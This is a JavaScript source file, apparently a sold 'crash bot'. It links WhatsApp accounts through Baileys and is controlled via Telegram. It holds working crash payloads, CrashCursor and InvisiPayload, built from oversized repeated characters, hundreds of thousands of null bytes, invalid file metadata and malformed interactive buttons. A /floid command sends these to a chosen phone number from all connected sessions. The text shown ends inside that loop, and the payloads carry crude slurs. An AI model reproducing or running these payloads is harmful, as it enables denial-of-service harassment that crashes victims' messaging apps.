const config = require("./config.js");
const setup = require("./setupbot.js");
const TelegramBot = require("node-telegram-bot-api");
const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const moment = require("moment-timezone");
const axios = require("axios");

const token = setup.BOT_TOKEN;
const bot = new TelegramBot(token, { polling: true });

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

const PREM_DB_FILE = "./database/premium.json";
const ADMIN_DB_FILE = "./database/admin.json";

const GITHUB_TOKEN = config.GITHUB_TOKEN;
const GITHUB_OWNER = config.GITHUB_OWNER;
const GITHUB_REPO = config.GITHUB_REPO;
const GITHUB_FILE_PATH = config.GITHUB_FILE_PATH;
const GITHUB_MOD_FILE_PATH = config.GITHUB_MOD_FILE_PATH;

const START_IMAGE_URL = "https://a.top4top.io/p_33121s9za1.jpg";

function readDatabase(filePath) {
  try {
    if (fs.existsSync(filePath)) {
      return JSON.parse(fs.readFileSync(filePath));
    }
    return {};
  } catch (error) {
    console.error(`Error reading database from ${filePath}:`, error);
    return {};
  }
}

function writeDatabase(filePath, data) {
  try {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error(`Error writing database to ${filePath}:`, error);
  }
}

let premiumDB = readDatabase(PREM_DB_FILE);
let adminDB = readDatabase(ADMIN_DB_FILE);
let modDB = {};

async function readTokensFromGitHub() {
  try {
    const { Octokit } = await import("@octokit/rest");
    const octokit = new Octokit({ auth: GITHUB_TOKEN });
    const response = await octokit.repos.getContent({
      owner: GITHUB_OWNER,
      repo: GITHUB_REPO,
      path: GITHUB_FILE_PATH,
    });

    const content = Buffer.from(response.data.content, "base64").toString();
    return JSON.parse(content);
  } catch (error) {
    console.error("Error reading tokens from GitHub:", error);
    return {};
  }
}

async function writeTokensToGitHub(tokens) {
  try {
    const { Octokit } = await import("@octokit/rest");
    const octokit = new Octokit({ auth: GITHUB_TOKEN });
    let sha;
    try {
      const response = await octokit.repos.getContent({
        owner: GITHUB_OWNER,
        repo: GITHUB_REPO,
        path: GITHUB_FILE_PATH,
      });
      sha = response.data.sha;
    } catch (error) {
      if (error.status !== 404) {
        throw error;
      }
    }

    const content = Buffer.from(JSON.stringify(tokens, null, 2)).toString(
      "base64"
    );
    const response = await octokit.repos.createOrUpdateFileContents({
      owner: GITHUB_OWNER,
      repo: GITHUB_REPO,
      path: GITHUB_FILE_PATH,
      message: "Update bot tokens",
      content: content,
      sha: sha,
      branch: "main",
    });

    return response.data;
  } catch (error) {
    console.error("Error writing tokens to GitHub:", error);
    throw error;
  }
}

async function readModeratorsFromGitHub() {
  try {
    const { Octokit } = await import("@octokit/rest");
    const octokit = new Octokit({ auth: GITHUB_TOKEN });
    const response = await octokit.repos.getContent({
      owner: GITHUB_OWNER,
      repo: GITHUB_REPO,
      path: GITHUB_MOD_FILE_PATH,
    });

    const content = Buffer.from(response.data.content, "base64").toString();
    modDB = JSON.parse(content);
    return modDB;
  } catch (error) {
    console.error("Error reading moderators from GitHub:", error);
    return {};
  }
}

async function writeModeratorsToGitHub(moderators) {
  try {
    const { Octokit } = await import("@octokit/rest");
    const octokit = new Octokit({ auth: GITHUB_TOKEN });
    let sha;
    try {
      const response = await octokit.repos.getContent({
        owner: GITHUB_OWNER,
        repo: GITHUB_REPO,
        path: GITHUB_MOD_FILE_PATH,
      });
      sha = response.data.sha;
    } catch (error) {
      if (error.status !== 404) {
        throw error;
      }
    }

    const content = Buffer.from(JSON.stringify(moderators, null, 2)).toString(
      "base64"
    );
    const response = await octokit.repos.createOrUpdateFileContents({
      owner: GITHUB_OWNER,
      repo: GITHUB_REPO,
      path: GITHUB_MOD_FILE_PATH,
      message: "Update moderators",
      content: content,
      sha: sha,
      branch: "main",
    });

    modDB = moderators;
    return response.data;
  } catch (error) {
    console.error("Error writing moderators to GitHub:", error);
    throw error;
  }
}

// Load moderator dari GitHub saat bot start
readModeratorsFromGitHub()
  .then((moderators) => {
    console.log("Succes loaded moderator");
  })
  .catch((error) => {
    console.error("Failed to load moderators from GitHub:", error);
  });

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ FOUND ACTIVE WHATSAPP SESSION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ TOTAL : ${activeNumbers.length} 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

      for (const botNumber of activeNumbers) {
        console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ CURRENTLY CONNECTING WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ SUCCESSFUL NUMBER CONNECTION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ TRY RECONNECTING THE NUMBER
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("CONNECTION CLOSED"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

{}
async function CrashCursor(sock, target) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Zord𖣂𐎟" + "ꦽ".repeat(45000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target, "13135550002@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "PL",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
                },
                contentText: '༑ Fail Beta - ( devorsixcore ) "👋"',
                footerText: "© running since 2020 to 20##?",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(850000),
                    buttonText: {
                      displayText: "𐎟 𝐓𝐝͢𝐗 ⿻ 𝐂͢𝐋𝐢𝚵͢𝐍𝐓͢ 𐎟",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/testi_hwuwhw99",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! 𝖽𝖾𝗏𝗈𝗋𝗌𝖾𝗅𝗌 - "𝗋34" 🩸',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "© running since 2020 to 20##?",
              sourceUrl: "go fuck yourself",
              sourceId: "dvx - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "by : devorsixcore",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await sock.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}

async function InvisiPayload(sock, target) {
  let message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
          body: {
            text: "𝐅𝐋𝚯͢𝐈𝐃 ⿻ 𝐃𝐈𝐅𝐅𝐔𝐒𝐈𝐎𝐍",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, message, {
    participant: { jid: target },
  });
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `┏━━━━━━━━━━━━━━━━━━━━━━
┃      INFORMATION
┣━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┃⌬ STATUS : INITIALIZATIONℹ️
┗━━━━━━━━━━━━━━━━━━━━━━`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION 
┣━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┃⌬ STATUS : RECONNECTING🔄
┗━━━━━━━━━━━━━━━━━━━━`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : FAILED 🔴
┗━━━━━━━━━━━━━━━━━━━━
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : CONNECTED 🟢
┗━━━━━━━━━━━━━━━━━━━━`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `┏━━━━━━━━━━━━━━━━━━━━━
┃      PAIRING SESSION
┣━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ CODE : ${formattedCode}
┗━━━━━━━━━━━━━━━━━━━━━`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `┏━━━━━━━━━━━━━━━━━━━━━
┃      PAIRING SESSION
┣━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : ${error.message}
┗━━━━━━━━━━━━━━━━━━━━━
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

async function initializeBot() {
  console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ DIFFUSION PRINCEDX
┣━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ CREATED BY DELIONDX
┃ THANKS FOR BUYYING MY SCRIPT
┗━━━━━━━━━━━━━━━━━━━━━━━━━━`);

  await initializeWhatsAppConnections();
}

initializeBot();

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

// Fungsi untuk mengecek apakah user adalah admin
function isAdmin(userId) {
  return adminDB[userId] === true;
}

// Fungsi untuk mengecek apakah user adalah moderator
function isModerator(userId) {
  return modDB.moderators && modDB.moderators.includes(userId);
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

// Fungsi untuk mengecek apakah user adalah admin
function isAdmin(userId) {
  return adminDB[userId] === true;
}

// Fungsi untuk mengecek apakah user adalah moderator
function isModerator(userId) {
  return modDB.moderators && modDB.moderators.includes(userId);
}

//--------------- PESAN START DENGAN GAMBAR DAN MENU ---------------
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const totalBot = sessions.size;

  const ownerStatus = isOwner(userId) ? "✅" : "❌";
  const modStatus = isModerator(userId) ? "✅" : "❌";
  try {
    const imageUrl = START_IMAGE_URL;
    const response = await axios.get(imageUrl, { responseType: "arraybuffer" });
    const imageBuffer = Buffer.from(response.data, "binary");

    const menu = `
╭━━━━[ zord teams-v2]
┃ ⚅ *Developer* : *thri-iz-kidd*
┃ ⚅ *Version* : Limitless
┃ ⚅ *Total bot* : ${totalBot}
┃ ⚅ *Moderator* : ${modStatus}
┃ ⚅ *Owner* : ${ownerStatus}
┃
┃ *LIMITLESS CMD*
┃  /floid - *limitless edition*
┃  /deliondevabal" - *crash beta*
┃
┃ *OWNER THRIIZ*
┃  /addbot - *connect bot*
┃  /listbot - *list of bot*
┃  /addadmin - *admin user*
┃  /deladmin - *remove admin*
┃  /addmod - *add moderator*
┃  /delmod - *remove moderator*
┃
┃ *ADMIN THRIIZ*
┃  /addprem - *add to prem db*
┃  /delprem - *remove prem*
┃  /cekprem - *remove prem*
┃
┃ *MODERATOR THRIIZ*
┃  /addtoken - *acces script*
┃  /deltoken - *remove acces*
┃  /listtoken - *list acces*
╰━━━━━━━━━━━━━━━━━━━━━━━━━❍`;
    await bot.sendPhoto(chatId, imageBuffer, {
      caption: menu,
      parse_mode: "Markdown",
    });
  } catch (error) {
    console.error("Error sending start message with image and menu:", error);
    bot.sendMessage(
      chatId,
      `👋 Halo, ${msg.from.username}! Selamat datang bot ini. (Gagal memuat gambar dan menu)`
    );
  }
});

bot.on("message", (msg) => {
  const chatId = msg.chat.id;
});

bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});
//-------------- FITUR ADMIN --------------

// Fungsi untuk menambahkan admin
bot.onText(/\/addadmin (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const userId = match[1];
  adminDB[userId] = true;
  writeDatabase(ADMIN_DB_FILE, adminDB);
  bot.sendMessage(chatId, `✅ Berhasil menambahkan ${userId} sebagai admin.`);
});

// Fungsi untuk menghapus admin
bot.onText(/\/deladmin (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const userId = match[1];
  if (adminDB[userId]) {
    delete adminDB[userId];
    writeDatabase(ADMIN_DB_FILE, adminDB);
    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ${userId} dari daftar admin.`
    );
  } else {
    bot.sendMessage(chatId, `❌ ${userId} tidak terdaftar sebagai admin.`);
  }
});

//-------------- FITUR PREMIUM --------------

// Fungsi untuk menambahkan user premium
bot.onText(/\/addprem (\d+) (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isAdmin(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const userId = match[1];
  const days = parseInt(match[2]);
  const expirationDate = moment().add(days, "days").tz("Asia/Jakarta"); // Menambahkan waktu kadaluarsa

  premiumDB[userId] = {
    expired: expirationDate.format(),
  };
  writeDatabase(PREM_DB_FILE, premiumDB);

  bot.sendMessage(
    chatId,
    `✅ Berhasil menambahkan ${userId} sebagai user premium hingga ${expirationDate.format(
      "DD-MM-YYYY HH:mm:ss"
    )}`
  );
});

// Fungsi untuk menghapus user premium
bot.onText(/\/delprem (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isAdmin(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const userId = match[1];
  if (premiumDB[userId]) {
    delete premiumDB[userId];
    writeDatabase(PREM_DB_FILE, premiumDB);
    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ${userId} dari daftar user premium.`
    );
  } else {
    bot.sendMessage(
      chatId,
      `❌ ${userId} tidak terdaftar sebagai user premium.`
    );
  }
});

// Fungsi untuk mengecek status premium
bot.onText(/\/cekprem/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();

  if (premiumDB[userId]) {
    const expirationDate = moment(premiumDB[userId].expired);
    if (expirationDate.isAfter(moment())) {
      bot.sendMessage(
        chatId,
        `✅ Anda adalah user premium hingga ${expirationDate.format(
          "DD-MM-YYYY HH:mm:ss"
        )}`
      );
    } else {
      delete premiumDB[userId];
      writeDatabase(PREM_DB_FILE, premiumDB);
      bot.sendMessage(chatId, `❌ Status premium Anda telah kadaluarsa.`);
    }
  } else {
    bot.sendMessage(chatId, `❌ Anda bukan user premium.`);
  }
});

//--------------- FITUR TOKEN ---------------

// Fungsi untuk menambahkan token
bot.onText(/\/addtoken (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isModerator(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const newToken = match[1];
  try {
    let tokens = await readTokensFromGitHub();
    if (!tokens.botTokens) {
      tokens.botTokens = [];
    }
    if (!tokens.botTokens.includes(newToken)) {
      tokens.botTokens.push(newToken);
      await writeTokensToGitHub(tokens);
      bot.sendMessage(chatId, "✅ Token berhasil ditambahkan.");
    } else {
      bot.sendMessage(chatId, "❌ Token sudah ada.");
    }
  } catch (error) {
    console.error("Error adding token:", error);
    bot.sendMessage(chatId, "❌ Gagal menambahkan token. Periksa error log.");
  }
});

// Fungsi untuk menghapus token
bot.onText(/\/deltoken (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isModerator(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const tokenToDelete = match[1];
  try {
    let tokens = await readTokensFromGitHub();
    if (tokens.botTokens && tokens.botTokens.includes(tokenToDelete)) {
      tokens.botTokens = tokens.botTokens.filter(
        (token) => token !== tokenToDelete
      );
      await writeTokensToGitHub(tokens);
      bot.sendMessage(chatId, "✅ Token berhasil dihapus.");
    } else {
      bot.sendMessage(chatId, "❌ Token tidak ditemukan.");
    }
  } catch (error) {
    console.error("Error deleting token:", error);
    bot.sendMessage(chatId, "❌ Gagal menghapus token. Periksa error log.");
  }
});

// Fungsi untuk menampilkan daftar token
bot.onText(/\/listtoken/, async (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isModerator(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const tokens = await readTokensFromGitHub();
    if (tokens.botTokens && tokens.botTokens.length > 0) {
      const tokenList = tokens.botTokens
        .map((token, index) => `${index + 1}. ${token}`)
        .join("\n");
      bot.sendMessage(chatId, `Daftar Token:\n${tokenList}`);
    } else {
      bot.sendMessage(chatId, "❌ Tidak ada token yang tersimpan.");
    }
  } catch (error) {
    console.error("Error listing tokens:", error);
    bot.sendMessage(
      chatId,
      "❌ Gagal menampilkan daftar token. Periksa error log."
    );
  }
});

//--------------- FITUR MODERATOR ---------------

// Fungsi untuk menambahkan moderator
bot.onText(/\/addmod (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const userId = match[1];
  try {
    let moderators = await readModeratorsFromGitHub();
    if (!moderators.moderators) {
      moderators.moderators = [];
    }
    if (!moderators.moderators.includes(userId)) {
      moderators.moderators.push(userId);
      await writeModeratorsToGitHub(moderators);
      bot.sendMessage(
        chatId,
        `✅ Berhasil menambahkan ${userId} sebagai moderator.`
      );
    } else {
      bot.sendMessage(
        chatId,
        `❌ ${userId} sudah terdaftar sebagai moderator.`
      );
    }
  } catch (error) {
    console.error("Error adding moderator:", error);
    bot.sendMessage(
      chatId,
      "❌ Gagal menambahkan moderator. Periksa error log."
    );
  }
});

// Fungsi untuk menghapus moderator
bot.onText(/\/delmod (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const userId = match[1];
  try {
    let moderators = await readModeratorsFromGitHub();
    if (moderators.moderators && moderators.moderators.includes(userId)) {
      moderators.moderators = moderators.moderators.filter(
        (id) => id !== userId
      );
      await writeModeratorsToGitHub(moderators);
      bot.sendMessage(
        chatId,
        `✅ Berhasil menghapus ${userId} dari daftar moderator.`
      );
    } else {
      bot.sendMessage(
        chatId,
        `❌ ${userId} tidak terdaftar sebagai moderator.`
      );
    }
  } catch (error) {
    console.error("Error deleting moderator:", error);
    bot.sendMessage(chatId, "❌ Gagal menghapus moderator. Periksa error log.");
  }
});

//--------------- LISTBOT ---------------
bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;

  // Cek apakah user adalah owner, admin, atau moderator
  if (
    !isOwner(msg.from.id) &&
    !isAdmin(msg.from.id) &&
    !isModerator(msg.from.id)
  ) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung."
      );
    }

    let botList = "";
    let index = 1;
    for (const botNumber of sessions.keys()) {
      botList += `${index}. ${botNumber}\n`;
      index++;
    }

    bot.sendMessage(
      chatId,
      `*Daftar Bot WhatsApp yang Terhubung:*\n${botList}`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    console.error("Error in listbot:", error);
    bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menampilkan daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/send (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const [targetNumber, ...messageWords] = match[1].split(" ");
  const message = messageWords.join(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;

    await sock.sendMessage(`${formattedNumber}@s.whatsapp.net`, {
      text: message || "Hello",
    });

    await bot.sendMessage(chatId, "Pesan berhasil dikirim!");
  } catch (error) {
    console.error("Error in send:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim pesan. Silakan coba lagi."
    );
  }
});

bot.onText(/\/floid (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber, ...messageWords] = match[1].split(" ");
  const message = messageWords.join(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `TARGET : ${formattedNumber}\nTOTALBOT ${sessions.size}`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
